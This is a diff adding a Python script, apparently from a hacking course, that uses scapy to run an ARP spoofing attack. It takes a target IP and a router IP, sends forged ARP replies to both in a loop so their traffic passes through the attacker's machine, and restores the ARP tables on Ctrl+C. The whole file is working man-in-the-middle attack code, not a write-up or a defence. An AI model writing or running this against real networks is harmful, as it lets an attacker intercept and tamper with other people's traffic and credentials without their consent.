@@ -1,0 +1,63 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import argparse
+import sys
+import time
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target_ip",dest="target_ip", help="Add target machine ip")
+    parser.add_argument("-r", "--router_ip",dest="router_ip", help="Add getway ip address for subnet")
+    options = parser.parse_args()
+    return options
+def get_mac(ip):
+    #arp_request:send request to target ip 
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    
+    arp_request_breadcast = broadcast/arp_request
+    
+    
+    #scapy.srp Send and recive packets at layer2, timeout is how much time to wait after packet has been sent.
+    answere_list = scapy.srp(arp_request_breadcast, timeout=1, verbose=False)[0]
+    return answere_list[0][1].hwsrc
+    
+
+def spoof(target_ip, router_ip):
+
+    target_mac = get_mac(target_ip)
+
+    target_mac = get_mac(target_ip)
+
+    #IMPORTANT: field op=2 makes packet to send respons, this will be accept immediately 
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip )
+    scapy.send(packet, verbose=False)
+    
+def restore_connection(target_ip, router_ip):
+    target_mac = get_mac(target_ip)
+    router_mac = get_mac(router_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
+    scapy.send(packet, verbose=False)
+
+options = get_arguments()
+
+target_ip = options.target_ip
+
+router_ip = options.router_ip
+
+
+
+try:
+    packets_sent_count = 0
+    while True:
+        spoof(target_ip, router_ip)
+        spoof(router_ip, target_ip)
+        packets_sent_count += 2
+        print("\r[+] Sent " + str(packets_sent_count)),
+        sys.stdout.flush()  
+        time.sleep(2)
+except KeyboardInterrupt:
+        print("\n[-] Detecting CTRL + C ..... Resetting ARP tables")
+        restore_connection(target_ip, router_ip)
+        restore_connection(router_ip, target_ip)
